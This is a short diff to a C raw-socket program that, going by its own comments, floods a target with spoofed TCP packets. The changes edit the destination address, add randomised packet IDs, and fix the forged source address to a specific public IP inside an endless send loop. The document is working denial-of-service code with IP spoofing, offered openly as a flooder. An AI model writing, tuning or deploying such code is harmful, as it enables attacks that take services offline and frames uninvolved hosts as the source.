@@ -46,7 +46,7 @@ csum (unsigned short *ptr, int nbytes)
 
   return (answer);
 }
-#define DEST_IP_ADDR	"10.188.117.32"
+#define DEST_IP_ADDR	"10.188.117.30"
 int
 main (int argc, char **argv)
 {
@@ -129,10 +129,11 @@ main (int argc, char **argv)
   //Uncommend the loop if you want to flood :)
   while (1)
   {
+     iph->id = htons (rand()%65535);	//Id of this packet
      strcpy (source_ip, "216.241.237.121");
      psh.source_address = inet_addr (source_ip);
      // sprintf (source_ip,"%d.%d.%d.%d",rand()%255,rand()%255,rand()%255,rand()%255);
-     sprintf (source_ip, "216.241.237.%d", rand()%255);
+     // sprintf (source_ip, "216.241.237.%d", rand()%255);
      iph->saddr = inet_addr (source_ip);	//Spoof the source ip address
      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
      tcph->source = htons (rand()%65535);
